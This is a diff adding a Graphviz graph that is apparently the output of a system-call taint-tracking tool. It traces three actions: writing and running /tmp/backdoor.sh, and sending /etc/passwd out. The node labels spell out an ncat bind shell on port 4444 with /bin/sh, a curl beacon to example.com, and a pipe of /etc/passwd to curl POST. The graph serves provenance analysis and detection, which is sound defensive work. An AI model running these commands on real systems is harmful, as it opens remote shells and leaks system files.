@@ -1,0 +1,66 @@
+digraph syscon {
+  rankdir=LR;
+  bgcolor="#fafafa";
+  newrank=true;
+  node [fontname="monospace", fontsize=9, margin="0.15,0.1"];
+  edge [fontname="monospace", fontsize=8];
+  graph [nodesep=0.4, ranksep=0.6];
+
+  // Process nodes
+  p2623413 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bbdefb" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sh -c \n    echo &quot;#!/bin/sh&quot;<BR/>  &gt; /tmp/backdoor.sh\n    echo<BR/>  &quot;ncat -l -p 4444 -e /bin/sh<BR/>  &amp;&quot; &gt;&gt;<BR/>  /tmp/backdoor.sh\n    echo &quot;curl<BR/>  -s http://example.com/beacon &gt;<BR/>  /dev/null 2&gt;&amp;1 || true&quot;<BR/>  &gt;&gt; /tmp/backdoor.sh\n    chmod<BR/>  +x /tmp/backdoor.sh\n</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623413 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2623483 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fff9c4" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sh -c \n    cat /etc/passwd | curl -s -X<BR/>  POST -d @- http://example.com &gt;<BR/>  /dev/null 2&gt;&amp;1 || true\n</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623483 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2623448 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#c8e6c9" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>backdoor.sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ /bin/sh /tmp/backdoor.sh</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623448 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2623420 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>chmod</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ chmod +x /tmp/backdoor.sh</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623420 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623455 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cbe6cc" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>ncat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ ncat -l -p 4444 -e /bin/sh</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623455 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623489 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat /etc/passwd</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623489 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623456 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cbe6cc" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>curl</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ curl -s http://example.com/beacon</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623456 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623490 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>curl</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ curl -s -X POST -d @- http://example.com</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623490 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2623300 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#e8e8e8" COLOR="#999999" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sleep</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sleep 300</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2623300 | action #0</FONT></TD></TR></TABLE>>];
+  { rank=same; p2623413; p2623483; p2623448; p2623300 }
+
+  // File nodes (data flow mediators)
+  f6331709758066418338 [shape=ellipse, label="/tmp/backdoor.sh", fillcolor="#ffe0b2", style=filled, color="#666666"];
+  f13789497318489331601 [shape=ellipse, label="/etc/passwd", fillcolor="#ffcdd2", style=filled, color="#666666"];
+
+  // Network endpoints
+  n5930532989328386707 [shape=diamond, label="[2606:4700::6812:1b78]:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n6957319735567915914 [shape=diamond, label="104.18.26.120:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n5930532988036918738 [shape=diamond, label="[2606:4700::6812:1a78]:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n6957319778186358891 [shape=diamond, label="104.18.27.120:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n1660420052178286472 [shape=diamond, label="10.11.12.1:53", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+
+  // Fork/spawn edges
+  p2623413 -> p2623420 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623448 -> p2623455 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623448 -> p2623456 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623413 -> p2623448 [label="file", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623483 -> p2623490 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2623483 -> p2623489 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+
+  // Data flow edges
+  p2623413 -> f6331709758066418338 [label="write", color="#2e7d32", fontcolor="#2e7d32", penwidth=1.5];
+  f6331709758066418338 -> p2623448 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  f6331709758066418338 -> p2623448 [label="exec", color="#e65100", fontcolor="#e65100", penwidth=2.0, style=bold];
+  p2623420 -> f6331709758066418338 [label="chmod", color="#6a1b9a", fontcolor="#6a1b9a"];
+  f13789497318489331601 -> p2623456 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  f13789497318489331601 -> p2623489 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  f13789497318489331601 -> p2623490 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  // Network edges
+  p2623456 -> n5930532989328386707 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623490 -> n5930532989328386707 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623456 -> n6957319735567915914 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623490 -> n6957319735567915914 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623456 -> n5930532988036918738 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623490 -> n5930532988036918738 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623456 -> n6957319778186358891 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623490 -> n6957319778186358891 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623456 -> n1660420052178286472 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2623490 -> n1660420052178286472 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+
+  // Legend
+  subgraph cluster_legend {
+    label="Legend"; style=rounded; color="#cccccc"; fontsize=10;
+    node [shape=plaintext, fontsize=8];
+    legend [label=<<TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0"><TR><TD BGCOLOR="#bbdefb">Action #1: create backdoor script</TD></TR><TR><TD BGCOLOR="#c8e6c9">Action #2: sh /tmp/backdoor.sh</TD></TR><TR><TD BGCOLOR="#fff9c4">Action #3: exfiltrate credentials</TD></TR></TABLE>>];
+  }
+}
